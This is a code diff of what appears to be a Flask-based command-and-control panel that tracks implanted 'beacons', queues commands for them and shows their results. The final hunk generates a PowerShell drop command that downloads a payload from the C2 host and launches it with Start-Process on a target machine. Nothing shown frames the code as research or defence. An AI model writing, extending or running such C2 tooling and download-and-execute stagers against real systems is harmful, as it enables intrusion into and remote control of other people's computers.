@@ -118,12 +118,18 @@ def get_beacons():
 def get_beacon_detail(hostname):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("SELECT ip, timestamp, payload FROM beacons WHERE hostname = ? ORDER BY timestamp DESC LIMIT 1", (hostname,))
+
+    # Get the most recent beacon check-in for this host
+    c.execute("SELECT ip, payload, MAX(timestamp) as last_seen FROM beacons WHERE hostname = ?", (hostname,))
     row = c.fetchone()
+
     if not row:
+        conn.close()
         return jsonify({"error": "Beacon not found"}), 404
 
-    ip, timestamp, payload = row
+    ip, payload, last_seen = row
+
+    # Get the last 10 tasks
     c.execute("SELECT command, result FROM tasks WHERE hostname = ? ORDER BY id DESC LIMIT 10", (hostname,))
     tasks = [{"command": cmd, "result": res} for cmd, res in c.fetchall()]
     conn.close()
@@ -131,10 +137,13 @@ def get_beacon_detail(hostname):
     return jsonify({
         "hostname": hostname,
         "ip": ip,
-        "timestamp": timestamp,
+        "timestamp": last_seen,
         "payload": payload,
         "tasks": tasks
     })
+
+
+
 
 @app.route('/add_task', methods=['POST'])
 @login_required
@@ -310,7 +319,7 @@ def upload():
         file.save(save_path)
 
         ip = request.host.split(':')[0]
-        drop_cmd = f"Invoke-WebRequest http://{ip}/payloads/{filename} -OutFile {filename}; Start-Process {filename}"
+        drop_cmd = f"Invoke-WebRequest {C2_HOST}/payloads/{filename} -OutFile {filename}; Start-Process {filename}"
 
         return render_template("upload.html", success=True, filename=filename, drop_cmd=drop_cmd)
 
